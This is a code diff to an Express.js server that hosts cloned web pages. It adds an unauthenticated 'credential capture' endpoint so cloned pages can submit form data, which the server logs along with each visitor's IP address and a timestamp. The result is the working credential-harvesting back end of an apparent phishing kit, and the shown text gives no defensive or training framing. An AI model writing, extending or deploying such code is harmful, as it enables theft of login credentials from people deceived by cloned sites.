@@ -608,6 +608,22 @@ app.get("/clones/:folder/index.html", requireAuth, (req, res) => {
 
 app.use("/clones", requireAuth, express.static(CLONE_DIR));
 
+// Credential capture endpoint — served WITHOUT auth so the cloned page can POST
+app.post("/clones/:folder/capture.php", express.json({ limit: "16kb" }), (req, res) => {
+  const folder = (req.params.folder || "").replace(/[^a-zA-Z0-9_.-]/g, "");
+  if (!folder) return res.status(400).json({ error: "bad folder" });
+  const dir = path.join(CLONE_DIR, folder);
+  if (!fs.existsSync(dir)) return res.status(404).json({ error: "not found" });
+  const entry = {
+    ts: new Date().toISOString(),
+    ip: req.headers["x-forwarded-for"] || req.socket.remoteAddress || "",
+    data: req.body || {}
+  };
+  const logFile = path.join(dir, "captures.log");
+  fs.appendFileSync(logFile, JSON.stringify(entry) + "\n");
+  res.json({ ok: true });
+});
+
 app.get("/api/clone-list", requireAuth, (req, res) => {
   try {
     if (!fs.existsSync(CLONE_DIR)) return res.json({ ok: true, clones: [] });
